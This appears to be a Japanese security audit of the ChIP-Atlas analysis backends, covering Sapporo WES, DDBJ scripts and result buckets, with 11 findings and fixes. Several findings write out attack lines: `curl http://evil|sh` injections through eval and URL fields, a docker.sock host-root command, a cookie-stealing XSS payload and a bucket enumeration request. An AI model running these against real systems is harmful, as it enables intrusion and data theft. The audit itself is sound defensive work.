# SEC-PIPE: 計算バックエンド／データ生成スクリプトの脆弱性監査

## 担当範囲の要約と総評

対象は「ユーザー入力を計算バックエンド (DDBJ WABI/SLURM, または ea.chip-atlas.org の Sapporo WES) で処理するスクリプト」と「データ生成スクリプト」。具体的には `script/enrichment-analysis/*`、`script/diff-analysis/diff_analysis_for_ChIP_ATAC_DNase.sh`、`script/sapporo-enrichment-analysis/*`、`script/update_2025/{EA,DA,PAGE}/*`、`rdf/*`、`lib/tasks/*.rake`、`lib/models/{experiment,analysis,bedfile,bedsize}.rb`、および結果 URL を組み立てる `lib/services/{wabi_service,sapporo_service,compute_router}.rb` / `routes/jobs.rb`。

各スクリプトの実行場所 (重要):
- `script/enrichment-analysis/*` (enrichment-analysis.sh, .cwl, Dockerfile): **Sapporo WES ホスト** (ea.chip-atlas.org) 上の cwltool コンテナ内で実行。`sapporo_config/run.sh` がジョブ実行の実体。
- `script/enrichment-analysis/bedToBoundProteins.sh`: **DDBJ WABI アカウント** (`/home/w3oki`) 用の旧版。ハードコードパスから DDBJ 上での実行を前提。
- `script/diff-analysis/diff_analysis_for_ChIP_ATAC_DNase.sh`: **DDBJ 計算ノード** (`/home/okishinya`, `w3oki`) 用の旧 diffbind スクリプト。
- `script/update_2025/{EA,DA,PAGE}`: **DDBJ NIG スパコン** (`sbatch`, `/data1/$USER`, `/home/okishinya`) 用の現行スクリプト。
- `rdf/*`, `lib/tasks/*.rake`, `lib/models/*`: **アプリサーバ (AWS EC2)** 上で管理者/デプロイ時に実行 (ユーザー入力は経由しない)。

総評: モデルローダ (Sequel の `multi_insert`, genome allowlist, `eval`/`send`/`constantize`/shell-out なし) と新アプリの HTTP 経路は概ね堅牢で、旧版の全開 SSRF (`/api/remoteUrlStatus`) が allowlist 化されるなど**ハードニングが追加**された箇所もある。一方で計算バックエンド側 (WES/DDBJ) には深刻な問題が残る: Sapporo WES の `run.sh` が未検証の `workflow_engine_parameters` を `eval` する構造 (認証無効・docker.sock マウント → 未認証 RCE→ホスト奪取)、結果ファイルが公開 MinIO バケットで**匿名列挙・閲覧可能** (ローカルで実証)、旧 diff スクリプトのユーザー URL の `| sh` 実行、生成 HTML への未エスケープ埋め込み (XSS)、パーミュテーション回数・入力サイズの無制限。新フロントエンドは旧 JS にあったクライアント側文字検証を撤去しており、防御は完全にバックエンド頼みになっている。

深刻度別件数: **Critical 1 / High 3 / Medium 3 / Low 2 / Info 2 (計 11)**

---

### SEC-PIPE-01 Sapporo WES `run.sh` が未検証パラメータを `eval` し未認証 RCE → ホスト奪取
- **深刻度**: Critical
- **種別**: Injection (RCE) / 認可 / 設定不備
- **場所**:
  - `script/sapporo-enrichment-analysis/sapporo_config/run.sh:116` (`wf_engine_params=$(head -n 1 ${wf_engine_params_file})`)
  - 同 `:45-56` (`cmd_txt="... ${wf_engine_params} ..."` → `eval ${cmd_txt}`)
  - 同 `:119-121` (`D_SOCK="-v /var/run/docker.sock:..."`, `DOCKER_CMD`)
  - `script/sapporo-enrichment-analysis/docker-compose.yml:9` (`/var/run/docker.sock` マウント), `:11` (`SAPPORO_DEBUG=True`), `:21` (`network_mode: host`)
  - `sapporo_config/service-info.json` (auth 設定なし = Sapporo 既定 `auth_enabled: false`)
- **内容**: `run.sh` の `run_enrichment-analysis` は `${wf_engine_params}` を文字列 `cmd_txt` に連結し `eval` する (`:56`)。`wf_engine_params` は Sapporo が run リクエストの `workflow_engine_parameters` フィールドから生成した `workflow_engine_params.txt` の1行目 (`:116`)。Sapporo 2.0.4 の `wf_engine_params_to_str()` はこの値を**空白連結するのみでシェルエスケープを一切行わず**、`validator.py` も `workflow_engine_parameters` の中身 (キー/値/文字種/サイズ) を検証しない。したがって `workflow_engine_parameters` に `; …` や `$(…)` を仕込めば `eval` で任意コマンドが実行される。Sapporo は既定で認証無効 (`auth_config.json` の `auth_enabled:false`)、`ea.chip-atlas.org/runs` は公開エンドポイント (旧フロントは直接 POST していた) なので、**インターネット上の誰でも**この POST を送れる。さらにコンテナは `/var/run/docker.sock` をマウントし `network_mode: host` なので、RCE 後に `docker run -v /:/host` 等でホスト (Sapporo EC2) の root を奪取できる。
- **攻撃シナリオ**:
  ```
  POST https://ea.chip-atlas.org/runs
    workflow_type=enrichment-analysis
    workflow_engine=enrichment-analysis
    workflow_params={...}
    workflow_engine_parameters={"--outdir; curl http://evil/x|sh #":""}  # eval に載る
  ```
  `run.sh:56` の `eval ${cmd_txt}` で `curl … | sh` が走り、docker.sock 経由でホスト root。アプリ (`SapporoService`) 自体はこのフィールドを送らないが、WES は第三者からの直接 POST を受理する。
- **本番環境 (AWS EC2 + nginx + ALB) での実際の影響**: WES ホストは EA の「オンデマンドのバックアップ計算系」で、WABI 稼働中は停止 (監査時 `ea.chip-atlas.org` は 503)。緩和要因は「常時起動していない」点のみで、これはアクセス制御ではない。WABI メンテナンス中に起動している間は、認証なしでバックアップ計算ホストの完全奪取 (docker.sock により root)、他ユーザーの投入データ・成果物への到達、同一ネットワーク (host net) への横展開が可能。
- **推奨対策**:
  1. `run.sh` から `eval` を排除し、コマンドは配列で組んで直接実行する (`"${DOCKER_CMD[@]}" "$container" --outdir "$outputs_dir" ...`)。少なくとも `${wf_engine_params}` を `eval` 行に入れない。EA では `workflow_engine_parameters` は使っていないので当該連結自体を削除してよい。
  2. Sapporo の認証を有効化 (`auth_enabled: true`, `secret_key` 変更) し、`ea.chip-atlas.org` をアプリサーバからのみ到達可能に制限 (SG/ALB/mTLS)。
  3. `/var/run/docker.sock` マウントと `network_mode: host` を廃止 (rootless/sysbox 等)、`SAPPORO_DEBUG=False`。
- **確認状況**: `コード上の推定` (エンドポイントが 503 のため未実証。upstream sapporo-service 2.0.4 の `run.py`/`run.sh`/`validator.py`/`auth_config.json` のソースとリポジトリの `run.sh`・`docker-compose.yml` から構造的に確認)

---

### SEC-PIPE-02 EA 結果・投入データが公開バケットで匿名列挙・閲覧可能 (他ユーザーの成果物・遺伝子リスト漏洩)
- **深刻度**: High
- **種別**: 情報漏洩 / 認可
- **場所**:
  - `lib/services/sapporo_service.rb:57-63` (`result_url`/`result_tsv_url` = `https://chip-atlas.dbcls.jp/data/enrichment-analysis/#{run_id}/#{run_id}.result.html`)
  - `lib/services/compute_router.rb:78-93` (`result_urls`)
  - Sapporo `run.sh:78-88` (`aws s3 cp ... s3://data/enrichment-analysis/ --recursive` で公開バケットへアップロード)
  - `routes/jobs.rb:94-104` (`/jobs/:id/result` は所有者検証なし)
- **内容**: WES 経路の EA 結果は `chip-atlas.dbcls.jp` の MinIO バケット `data` 配下 `enrichment-analysis/<run_id>/<run_id>.result.{html,tsv}` に置かれる。このバケットは**匿名でのバケット一覧 (ListObjects) が有効**で、`?prefix=enrichment-analysis/` で全 run_id を列挙でき、各 `*.result.html` / `*.result.tsv` を直接取得できる。run_id は UUID で1件ずつの推測は困難だが、一覧が公開されているため推測は不要。結果 TSV/HTML にはユーザーが投入した遺伝子リスト/BED 由来の解析結果 (関心のある抗原・細胞種) が含まれ、機微な研究情報になりうる。加えて Sapporo WES 自体 (`ea.chip-atlas.org`) は認証無効のため、`GET /runs` で全 run を列挙、`GET /runs/{id}` で各 run の `workflow_params` (=ユーザーが投入した遺伝子/BED 原文) と実行ログを誰でも取得できる (SEC-PIPE-01 の同一ホスト)。
- **攻撃シナリオ** (ローカルで実証した GET):
  ```
  $ curl 'https://chip-atlas.dbcls.jp/data?prefix=enrichment-analysis/&max-keys=2'
  → HTTP 200, <ListBucketResult> に実在の
     enrichment-analysis/<UUID>/<UUID>.result.html キーが列挙される
  ```
  以降 `NextMarker` を辿れば全ユーザーの結果 URL を機械的に収集し、`…/result.html` `…/result.tsv` をそのまま取得可能。
- **本番環境での実際の影響**: バケットは常時公開・稼働 (WES の稼働状態と無関係) のため、過去に WES 経路で実行された全ユーザーの EA 結果が現時点で第三者に閲覧可能。WABI 経路の結果は `dtn1.ddbj.nig.ac.jp/wabi/chipatlas/<id>?info=result` 側 (本監査対象外だが request ID は時刻+連番で列挙耐性は弱い)。緩和: run_id 単体は非連番。
- **推奨対策**: バケットの匿名 ListObjects を無効化し、`enrichment-analysis/` 配下は個別オブジェクト取得のみ許可。可能なら結果 URL に推測不能なトークンを付与、または閲覧をアプリ経由の認可付きプロキシに限定。Sapporo の認証有効化 (SEC-PIPE-01) で `/runs` 列挙も塞ぐ。保持期間 (`run_remove_older_than_days`) を設定。
- **確認状況**: `ローカルで実証済み` (バケット匿名列挙); WES `/runs` 列挙は `コード上の推定` (エンドポイント 503)

---

### SEC-PIPE-03 旧 Diff Analysis スクリプトがユーザー URL/ID を `| sh` と `eval` で実行 (コマンドインジェクション)
- **深刻度**: High
- **種別**: Injection (RCE) / SSRF
- **場所**:
  - `script/diff-analysis/diff_analysis_for_ChIP_ATAC_DNase.sh:88-102` (awk が `wget -q -O "$bw" "x[1]"` 等を生成し `| sh`)
  - 同 `:163` (`while ("cat …experimentList.tab| grep "GENOME| getline)` — `$GENOME` を awk コマンド文字列に連結)
  - 同 `:269`, `:460-464` (`eval $(echo ${GROUP_LBL[@]}| awk …)`, `eval $(… files=…)` — SRX 名などを eval)
- **内容**: `load_urls()` は SRX テキストエリア中の `^http` 行を awk で `wget -q -O "$bw" "URL"` という shell コマンド文字列に変換し `| sh` で実行する (`:102`)。URL はユーザー入力 (help によれば「Process of user original data」で URL 投入可)。生成コマンドは URL を二重引用符内に置くだけなので、URL に `"` や `` ` `` / `$(...)` を含めると引用符を抜けて任意コマンドが DDBJ 計算ノード上で実行される。さらに `$GENOME` を awk のコマンド文字列に埋め込む `getline` パイプ (`:163`)、SRX 名を含む awk 出力を `eval` する箇所 (`:269`,`:460`) があり、入力検証が緩い旧版では複数のインジェクション面がある。
- **攻撃シナリオ**: dataset に `http://x/$(curl http://evil|sh).bw` のような「URL」を投入 → `load_urls` の `| sh` で `$(...)` が展開・実行。
- **本番環境での実際の影響**: このファイルは DDBJ 計算ノード上で動く旧 diffbind スクリプト。**緩和要因**: (1) 新アプリは `ComputeRouter.JOB_TYPE_BACKENDS['diff_analysis'] = []` で diff ジョブを一切バックエンドに流さない (`compute_router.rb:21-24`)。(2) 現行の DDBJ 実体は `script/update_2025/DA/DA` で、そちらは `| sh` を廃し `wget -O "$bw_path" "$bw_url"` を `parallel` の関数引数として渡すよう**ハードニング済み** (旧→新で改善)。よって本ファイルはレガシー/未接続の可能性が高いが、リポジトリに残存し scope 指定されているため要撤去・要確認。
- **推奨対策**: 本ファイルを削除するか、URL/ID を厳格に検証 (`^https://(chip-atlas\.dbcls\.jp|…)/…$`、SRX は `^[SED]RX[0-9]+$`) し、`| sh`/`eval` を排して配列実行に置換。実運用が `update_2025/DA` であることをデプロイ手順で明示。
- **確認状況**: `コード上の推定`

---

### SEC-PIPE-04 Sapporo docker-compose が docker.sock マウント・host ネットワーク・デバッグ・認証なし
- **深刻度**: High
- **種別**: 設定不備 / 供給網
- **場所**: `script/sapporo-enrichment-analysis/docker-compose.yml:6-9` (host パス/`docker.sock` マウント), `:11` (`SAPPORO_DEBUG=True`), `:21` (`network_mode: host`), `:23-24` (`ports: 1122`), `sapporo_config/service-info.json` (auth 記述なし)
- **内容**: WES コンテナは `${PWD}/../../../chip-atlas:${PWD}/../../../chip-atlas` と `/var/run/docker.sock` をマウントし、`network_mode: host` で稼働。docker.sock はホスト root 相当の権限であり、コンテナ内 RCE (SEC-PIPE-01) がそのままホスト奪取に直結する。`SAPPORO_DEBUG=True` は Sapporo 側で詳細ログ (パラメータ等) を出力。認証は既定無効。host ネットワークによりポート分離がなく、EC2 上の他サービスへ横展開しやすい。
- **攻撃シナリオ**: SEC-PIPE-01 の RCE 後、`docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host` でホスト root。
- **本番環境での実際の影響**: WES ホスト起動時、単一の未認証 RCE で EC2 全体が侵害される構成。緩和は「常時停止」のみ。
- **推奨対策**: docker.sock 直マウントの廃止 (rootless docker / sysbox / gVisor)、`network_mode: host` の撤去とポート最小公開、`SAPPORO_DEBUG=False`、認証有効化、`chip-atlas` 全体マウントを必要ディレクトリ (data/others/lib, data/metadata) の read-only マウントに限定。
- **確認状況**: `コード上の推定`

---

### SEC-PIPE-05 パーミュテーション回数・入力サイズが無制限 (計算バックエンドの DoS)、新版でクライアント検証を撤去
- **深刻度**: Medium
- **種別**: DoS / 入力検証
- **場所**:
  - `script/enrichment-analysis/enrichment-analysis.sh:25` (`permTime="${8}"`), `:413-417` (`for i in $(seq $permTime); do shuffleBed …; done >$bedB`)
  - 同 `:443-449` (入力行数チェックは「0 か否か」のみ、上限なし)
  - `script/enrichment-analysis/enrichment-analysis.cwl:78` (`permTime: int` — 型検証のみ、大きさは無制限)
  - 新フロント `frontend/pages/enrichment-analysis.ts:594-623` (`buildEnrichmentParams` は文字種検証・行数上限なし。旧 `enrichment_analysis.js` の `evaluateText`/`isValid`/`replaceDataChars` に相当する検証が撤去された)
- **内容**: `permTime` はユーザー入力で、`seq $permTime` の回数だけ `shuffleBed` を実行し全結果を `$bedB` に書き出す。CWL は `int` 型を課すが大きさは制限しないため、`permTime` に巨大値 (例 10^9) を渡すと無限ループ相当の CPU 消費・`$bedB` へのディスク書き込みでバックエンドを枯渇させられる。入力 BED/遺伝子リストの行数・バイト数にも上限がなく、巨大入力で `bedtools intersect`/awk がメモリ・時間を消費。新フロントは旧 JS のクライアント側検証を撤去したため、防御はバックエンド頼み。WES/WABI へ直接投入する経路 (SEC-PIPE-01/02) ではフロントの UI 制約 (ドロップダウン) を完全に回避できる。
- **攻撃シナリオ**: `POST /runs`(WES) または WABI へ `permTime=999999999`, 巨大 `bedAFile` を投入 → バックエンド枯渇。
- **本番環境での実際の影響**: アプリ経路は nginx `client_max_body_size 16m` (`config/nginx/chip-atlas.conf:23`) で本文サイズのみ制限。`permTime` の大きさは無制限。WABI 経路は `WabiService` が `sbatchOptions '-p epyc -t 180'` を強制 (`wabi_service.rb:19-24`) するため SLURM 側で 180 分打ち切りという緩和があるが、WES 経路 (`run.sh`) には時間制限がない。DDBJ/WES 計算資源の DoS、ディスク充填。
- **推奨対策**: `enrichment-analysis.sh` 冒頭で `permTime` を上限付き整数に検証 (例 1〜100)、入力行数の上限チェック、`shuffleBed` ループにタイムアウト/上限。`update_2025/EA` 相当の allowlist 検証 (genome/exp_type/cell_class/threshold) を導入。WES 側にも実行時間制限を設定。
- **確認状況**: `コード上の推定`

---

### SEC-PIPE-06 生成結果 HTML へのユーザー文字列の未エスケープ埋め込み (Stored XSS / HTML インジェクション)
- **深刻度**: Medium
- **種別**: XSS / 出力エスケープ
- **場所**:
  - `script/enrichment-analysis/enrichment-analysis.sh:536-567` (`awk -v title="$title" -v descriptionA=… -v descriptionB=… { gsub("___Title___", title, $0); … print "<td>" $i "</td>" }` — HTML エスケープなし)
  - `script/enrichment-analysis/bedToBoundProteins.sh:255-286` (同構造)
  - `script/enrichment-analysis/btbpToHtml.txt` (`___Title___`/`___Targets___`/`___References___` プレースホルダ)
  - 新フロント側にサニタイズなし (`frontend/pages/enrichment-analysis.ts` / `diff-analysis.ts` は文字種検証を持たない。旧 `enrichment_analysis.js` の `isValid`(desc は `[A-Za-z0-9_.\-\s]`) は撤去)
- **内容**: `title`/`descriptionA`/`descriptionB` (および抗原・細胞名) が awk の `gsub` 置換文字列・`print "<td>"…` により結果 HTML へ**エスケープなしで**埋め込まれる。`<script>` 等を含む title を投入すると結果 HTML に生スクリプトが入る。結果 HTML は `chip-atlas.dbcls.jp` (データ/MinIO オリジン) から配信され、かつ SEC-PIPE-02 でそのオリジンの結果が匿名閲覧可能なため、攻撃者が信頼ドメイン配下に XSS ページを設置し、当該オリジン上の他データ窃取やフィッシングに悪用しうる。加えて awk `gsub` の置換文字列では `&`/`\` が特別扱いのため出力破損も起きる。
- **攻撃シナリオ**: `title=<img src=x onerror=fetch('//evil/'+document.cookie)>` を投入 → 結果 HTML に生埋め込み → `chip-atlas.dbcls.jp/data/enrichment-analysis/<id>/<id>.result.html` を開いた閲覧者で発火。
- **本番環境での実際の影響**: アプリ本体 (`*.chip-atlas.org`) とは別オリジンだが、`chip-atlas.dbcls.jp` を信頼するユーザーへの XSS/フィッシング、同オリジン上データへのアクセス。アプリの ERB は `escape_html: true` で保護されるが、結果 HTML はアプリを経由せず配信されるため無関係。
- **推奨対策**: awk で HTML 特殊文字 (`& < > " '`) をエスケープしてから埋め込む。`title`/`description*` をバックエンドで文字種検証 (英数・空白・`_.-` のみ)。`btbpToHtml.txt` の外部 CDN (`datatables.net`, jQuery) 依存も自ホスト化を検討。
- **確認状況**: `コード上の推定`

---

### SEC-PIPE-07 参照データ・メタデータ取得に完全性検証がない (供給網 / MITM)
- **深刻度**: Medium
- **種別**: 供給網 / 完全性
- **場所**:
  - `lib/tasks/metadata.rake:6-16` (`download_file`: HTTPS・200 判定のみ、チェックサム/署名/ピンニングなし)
  - `script/sapporo-enrichment-analysis/download-references.sh:8-11`(`curl` で `mc` 取得), `:24-39` (`mc cp` で reference/metadata 取得、チェックサムなし)
  - `rdf/generate-rdf:25` (`wget -nc`), `:33` (`openssl md5` はバージョン名生成用で完全性検証ではない)
  - `sapporo_config/run.sh:44` (`cwltool:3.1.…` 固定タグ) / `:82` (`amazon/aws-cli` タグ無し=latest)
- **内容**: EA/計算に使う reference (id2symbol, uniqueTSS, chrom.sizes, inSilicoChIP, fileList/experimentList) やアプリ DB 用メタデータを、いずれも完全性検証なしで `chip-atlas.dbcls.jp` 等から取得する。取得元の侵害や中間者により、悪意ある reference/メタデータを注入されると計算結果の汚染につながる。ただしローダ側 (`lib/models/*`) は Sequel の `multi_insert` (パラメータ化) と genome allowlist (`next unless genomes.key?`) を用い、`eval`/`send`/`constantize`/shell-out を持たないため、汚染メタデータによる **SQLi/RCE は成立しない**。`analysis.rb` は壊れたビルド署名 (`.1/.5/.10` サフィックス) を検知して警告 (`:585-600`)、`metadata.rake:115-125` がそれを表示する防御もある。破損ファイルでも `split("\t")` と列アクセスで概ねクラッシュしない。
- **攻撃シナリオ**: `chip-atlas.dbcls.jp` の侵害/DNS 詐称 → 改竄 reference BED を配布 → EA 結果汚染、または改竄 metadata で DB 内容 (表示テキスト) を差し替え。
- **本番環境での実際の影響**: 取得は HTTPS 経由で、実行は管理者/デプロイ時 (アプリサーバ) または Sapporo セットアップ時に限られる。TLS があるため受動的 MITM は困難。影響は主にデータ完全性 (計算結果・表示の汚染) で、コード実行やDB破壊には至らない。
- **推奨対策**: 取得ファイルに既知ハッシュ (マニフェスト) の照合を追加、コンテナは digest 固定 (`@sha256:…`)、`amazon/aws-cli` にタグ固定。
- **確認状況**: `コード上の推定`

---

### SEC-PIPE-08 ジョブ結果/ログ/ステータス経路に所有者検証がない・WABI ID が推測されやすい
- **深刻度**: Low
- **種別**: 認可 / 情報漏洩
- **場所**: `routes/jobs.rb:78-122` (`/jobs/:id/status|result|log` は `id`+`backend` のみで所有者検証なし), `frontend/components/job-tracker.ts:80-` (`parseWabiSubmitTime`: WABI ID = `wabi_chipatlas_YYYY-MMDD-HHMM-SS-<n>-<n>`)
- **内容**: ジョブ ID を知る (または推測する) 者は誰でも当該ジョブの status/result URL/log を取得できる。アプリはバックエンド (WABI/WES) の認可をそのまま踏襲しており、独自の認可を追加していない。WABI request ID は「時刻(秒)+連番+6桁」構造で、暗号的乱数ではないため列挙耐性は限定的 (末尾群は非自明なので総当りは大きいが理論上可能)。`validated_job_id` (`routes/jobs.rb:10-14`) は `\A[\w\-]+\z` で経路インジェクションは防いでいる。
- **攻撃シナリオ**: 近接時刻の WABI ID を推測し `/jobs/<id>/log?backend=wabi` で他ジョブ実行ログ (投入パラメータ断片を含む) を取得。
- **本番環境での実際の影響**: WABI ID は DDBJ 管理・鍵空間は大きい。WES 側は SEC-PIPE-02 の一覧公開の方が影響大。単独では Low。
- **推奨対策**: ジョブ投入時にアプリ側で推測不能なトークンを発行しユーザーに紐付け、結果参照はそのトークン検証経由に限定 (将来的な認可導入)。
- **確認状況**: `コード上の推定`

---

### SEC-PIPE-09 秘密情報の受け渡しがプロセスリスト/引数経由で露出しうる
- **深刻度**: Low
- **種別**: 秘密情報管理
- **場所**: `script/sapporo-enrichment-analysis/download-references.sh:2-3` (`mc <access-key> <secret-key>` を位置引数で受領), `:17` (`mc alias set … ${MINIO_ACCESS_KEY} ${MINIO_SECRET_KEY}`), `sapporo_config/run.sh:78-88` (`docker run -e AWS_ACCESS_KEY_ID=${MINIO_ACCESS_KEY} -e AWS_SECRET_ACCESS_KEY=…`)
- **内容**: MinIO のアクセス/シークレットキーをコマンド引数・環境変数として渡すため、同一ホストの他ユーザーから `ps`/`/proc/<pid>/cmdline`・シェル履歴で盗み見られうる。`run.sh` の `docker run -e` も同様にプロセスリストに露出。なお**リポジトリに平文の資格情報はコミットされていない** (秘密スキャン clean、`.env` は `.gitignore:19` で除外) 点は良好。`download-references.sh` は `${HOME}/.minio-env` から読む形も併用。
- **攻撃シナリオ**: 侵害された同居プロセス/一般ユーザーが `ps auxww` でキー奪取 → MinIO バケットへ書込。
- **本番環境での実際の影響**: 実行はセットアップ/アップロード時で、専有ホスト前提なら影響限定。多人数共有ホストでは露出。
- **推奨対策**: 引数渡しをやめ環境ファイル (600) / IAM ロール / STS 一時鍵に統一。`mc alias` は `MC_HOST_*` 環境変数経由に。
- **確認状況**: `コード上の推定`

---

### SEC-PIPE-10 Dockerfile: root 実行・パッケージ未固定
- **深刻度**: Info
- **種別**: 設定不備 / 供給網
- **場所**: `script/enrichment-analysis/Dockerfile:2` (`FROM r-base:4.4.2` — タグ固定は良), `:3` (`apt-get install -y bedtools` — バージョン未固定), `:4` (`CMD ["sleep","infinity"]`, 非 root ユーザー指定なし)
- **内容**: ベースは版固定されているが `bedtools` が未固定で再現性/供給網リスク。コンテナは root 実行。cwltool 経由でユーザー入力を処理するコンテナが root であることは、SEC-PIPE-01 の RCE 時の影響を増幅する。
- **推奨対策**: `bedtools=<version>` 固定、`USER` で非 root 化、ベースイメージ digest 固定。
- **確認状況**: `コード上の推定`

---

### SEC-PIPE-11 固定名テンポラリファイルによる競合/シンボリックリンク攻撃の余地
- **深刻度**: Info
- **種別**: 一時ファイル / 競合
- **場所**: `script/enrichment-analysis/bedToBoundProteins.sh:21-34` (`tmpForMotifOrBed`), `:65-66` (`tmpForGeneToBed`) を CWD に固定名で作成; `enrichment-analysis.sh:107-120` の `motifOrBed` も `tmpForMotifOrBed` 固定名を使用
- **内容**: 一部の一時ファイルが `mktemp` でなく固定名で CWD に作られる。共有作業ディレクトリで複数ジョブが同時実行されると衝突、または攻撃者が事前にシンボリックリンクを張れる環境では上書き先を誘導しうる。`EA_TMPDIR`/`qsortBed`/`motifbed` 等は `$RANDOM$RANDOM$RANDOM` やジョブ専用ディレクトリを使っており、そちらは比較的安全。WABI/CWL は通常ジョブごとに専用ディレクトリを割り当てるため実害は限定的。
- **推奨対策**: 全一時ファイルを `mktemp -d` 配下のジョブ専用ディレクトリに統一。
- **確認状況**: `コード上の推定`

---

## 問題なしと確認した項目 (監査済みで安全と判断したもの、簡潔に)

- **モデルローダのインジェクション耐性**: `lib/models/{experiment,analysis,bedfile,bedsize}.rb` の `load_from_file(s)` はいずれも `File.foreach` + `split("\t")` + Sequel `multi_insert` (パラメータ化) で、`eval`/`send`/`constantize`/バッククォート/`system` を一切使わない。genome は `next unless ChipAtlas::Experiment.genomes.key?(genome)` で allowlist 化。汚染メタデータでも SQLi/RCE は不成立、破損行でもクラッシュしにくい。
- **`total_number_of_reads`** (`experiment.rb:202-207`): プレースホルダ `?` で ID をバインドしており SQLi なし。
- **`clean_old_genomes.rake`**: FTS 再構築の生 SQL は `DB.literal` で値をエスケープ (`:71`)。トランザクション内・`assert_no_orphaned_fts_rows!` で整合性検証。
- **旧 SSRF の是正 (ハードニング追加)**: 旧 `old-app/app.rb:503` の `/api/remoteUrlStatus` は `Net::HTTP.get_response(URI.parse(params[:url]))` で任意 URL を叩く全開 SSRF。新版は `routes/api.rb:232` の `/api/remote_url_status` が `allowed_remote_url?` (`:13-19`: scheme 制限 + `ALLOWED_HOSTS` allowlist) で保護。
- **WabiService の運用パラメータ強制**: `wabi_service.rb:19-24,151-162` で `sbatchOptions '-p epyc -t 180'`・`format`・`result` をサーバ側で上書き (呼び出し側が上書き不可)。WABI 経路は SLURM 180 分制限で暴走を緩和。診断済み: 呼び出し側は operational 値を詐称できない (`test_operational_fields_cannot_be_spoofed_by_the_caller`)。
- **テスト時の誤送信防止**: `WabiService.LiveSubmitNotStubbed` / `DataProxy.LiveFetchNotStubbed` により、テスト環境で実ジョブ投入・実データ取得が起きないガードがある。
- **CWL の型検証**: `enrichment-analysis.cwl` は `typeA`/`typeB` を enum、`permTime`/`threshold`/`distance*` を int として宣言し cwltool が型検証 (大きさ制限は別途必要=SEC-PIPE-05)。
- **`update_2025/{EA,DA,PAGE}` の相対的堅牢性**: これらは `validate_arguments` で genome/exp_type/cell_class/threshold を allowlist 検証、変数を概ね二重引用符化、`DA` は旧 diff の `| sh` を廃し `wget -O "$path" "$url"` を `parallel` の関数引数として渡す (SEC-PIPE-03 の是正)。gene リストは awk で `gsub(/[^a-zA-Z0-9\t_\n]/,"_",$1)` によりサニタイズ。残る `eval $(awk …)` は検証済み SRX/ラベルのみを載せる (Info レベル)。
- **RDF 生成スクリプト** (`rdf/generate-rdf`, `bin/bed2ttl`, `bin/chr2genbank`, `bin/rdfize_*.awk`): 入力はユーザーではなく ChIP-Atlas 自身の peak/colo/target データ。genome/threshold はスクリプト内固定配列。ユーザー入力経路なし。`bash -n` エラーは awk スクリプトを bash で解析したことによる誤検知 (シェバンは `awk -f`/`gawk -f`) で問題なし。

## 未確認・不確実事項

- **ea.chip-atlas.org (Sapporo WES) は監査時 503** のため、SEC-PIPE-01/02(WES 部分)/04 は upstream sapporo-service 2.0.4 のソース (`run.py`/`run.sh` テンプレート/`validator.py`/`auth_config.json`) とリポジトリ内 `run.sh`・`docker-compose.yml` からの構造的推定。実機での `workflow_engine_parameters` 注入・`/runs` 匿名列挙は未実証 (要ブラウザ/要追加検証、ただし攻撃的リクエストは禁止事項)。
- **本番 Sapporo ホストで実際に配備されている `run.sh` が本リポジトリ版と同一か**は未確認 (git 履歴上「revert」で本リポジトリ版に戻っている `6a041ca` 等は確認)。デプロイ実体の確認が必要。
- **MinIO バケットの書込み権限**: 匿名 **読取/列挙**はローカルで実証したが、匿名 **書込み**可否は破壊的操作になるため未検証 (要追加検証)。
- **本番の WABI diff 経路が `diff-analysis/diff_analysis_for_ChIP_ATAC_DNase.sh` か `update_2025/DA/DA` か**は、コードからは後者が現行と推定されるが、DDBJ 側の実配備は未確認。前者が現役なら SEC-PIPE-03 は High → Critical 相当。
- **`chip-atlas.dbcls.jp` の TLS/取得元の完全性運用** (証明書・配信基盤) はアプリ外のため未評価。
- モデルローダは静的解析のみ。実際の巨大/不正メタデータ投入時のメモリ挙動は未計測。
